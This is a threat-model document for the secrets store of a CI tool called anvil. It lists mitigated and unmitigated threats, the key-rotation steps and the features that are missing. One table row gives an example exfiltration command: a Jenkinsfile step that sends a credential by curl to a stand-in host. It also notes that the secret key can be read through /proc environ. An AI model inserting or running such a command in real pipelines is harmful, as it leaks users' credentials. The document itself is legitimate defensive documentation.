# Secrets — threat model (v0.3.0)

## What anvil protects against

| Threat | Mitigation |
|---|---|
| Database file leaks (offline backup theft, disk decommission) | AES-256-GCM ciphertext only; the master key is NOT in the DB |
| Process memory dump after the process exited | Master key derived on-demand; values never linger in long-lived caches |
| Secret value appears in build logs / SSE stream | Per-build redaction set; the masker runs BEFORE the bus publish so SSE viewers also see `****` |
| Secret value appears in `ps`/shell history | CLI reads from stdin; web admin doesn't echo |
| Concurrent reader/writer races | next.jdbc transactional add!/lookup |

## What anvil does NOT protect against

| Threat | Why we don't claim to |
|---|---|
| Compromised anvil JVM (RCE) | Anything running as the anvil process can read the master key and call `lookup`. Defense is at the OS level (SELinux, AppArmor, systemd sandboxing). Our recipe in `docs/deploy/README.md` includes `ProtectSystem=strict` + `ReadWritePaths` minimization. |
| Compromised host (root) | Root can read `~/.config/anvil/master.key`. The mitigation is host hardening, not anvil. |
| Stolen `ANVIL_SECRET_KEY` env var (e.g. via /proc/<pid>/environ) | Anyone who can read the env can decrypt every credential. systemd's `ProtectProc` + capability dropping is the layer that matters. |
| Side channels (timing, cache attacks) on AES-GCM | We use the JDK's `javax.crypto.Cipher` which has CT instructions on modern CPUs; we don't claim resistance against a co-located malicious VM. |
| Build-time exfil by a malicious Jenkinsfile step | If you can write a Jenkinsfile that anvil executes, you can `sh 'curl exfil.example/?p=$PSW'` during the `withCredentials` window. Defense is at the code-review / signed-Jenkinsfile level. Anvil v0.3 does not implement Jenkinsfile signing. |

## Key rotation

Rotation is operator-driven via `anvil secrets rotate-master`. Anvil does not implement automatic rotation at v0.3.0. The documented procedure:

1. Generate a new key.
2. `anvil secrets rotate-master --new-key <new>`.
3. Update `ANVIL_SECRET_KEY` in the systemd unit.
4. Restart.

Step 3 is the brittle one — if you forget it, anvil will fall back to the on-disk `master.key` file (which `rotate-master` updated). That works but means the env var is silently superseded; document accordingly for your team.

## What's NOT in v0.3.0

- Vault / Cloud-KMS backends (AV3-6 defers to v0.3.x as plug-ins).
- Per-credential scoping ("this credential is usable only by job X"). Today every job that exists on this anvil can `withCredentials` any stored secret.
- Audit log of `lookup` calls. v0.3.x adds an append-only ledger.
- Hardware-token backing (YubiHSM, AWS Nitro, etc.). The `master-key-fn` indirection means a plug-in could swap this in without changes to crypto.clj.

If your threat model needs any of the above, Chengis (the commercial tier) has multi-tenant secret scoping + audit. Anvil's v0.3.0 stance is "single-team CI on a host you control."
